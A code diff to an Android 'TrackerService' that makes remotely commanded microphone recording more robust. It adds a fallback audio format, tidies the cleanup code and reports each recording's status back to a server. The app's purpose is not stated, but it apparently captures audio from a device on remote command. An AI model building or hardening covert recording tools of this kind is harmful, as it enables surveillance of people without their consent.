@@ -416,11 +416,20 @@ class TrackerService : Service() {
             recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
             recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
             recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-            recorder.setAudioSamplingRate(44100)
-            recorder.setAudioEncodingBitRate(96000)
             recorder.setOutputFile(outputFile.absolutePath)
 
-            recorder.prepare()
+            try {
+                recorder.prepare()
+            } catch (e: Exception) {
+                Log.w(TAG, "MPEG_4 prepare failed, trying THREE_GPP fallback: ${e.message}")
+                try { recorder.reset() } catch (_: Exception) {}
+                recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
+                recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
+                recorder.setOutputFile(outputFile.absolutePath)
+                recorder.prepare()
+            }
+
             recorder.start()
             Log.d(TAG, "Started ${durationSec}s mic recording to file: ${outputFile.absolutePath}")
 
@@ -432,8 +441,10 @@ class TrackerService : Service() {
         } finally {
             try {
                 recorder?.stop()
+            } catch (_: Exception) {}
+            try {
                 recorder?.release()
-            } catch (e: Exception) {}
+            } catch (_: Exception) {}
         }
 
         if (outputFile.exists() && outputFile.length() > 0) {
@@ -449,6 +460,7 @@ class TrackerService : Service() {
             ApiClient.updateCommandStatus(commandId, "failed", "Audio recording was empty or failed")
         }
     }
+
 
     private fun releaseWakeLock() {
         if (wakeLock?.isHeld == true) {
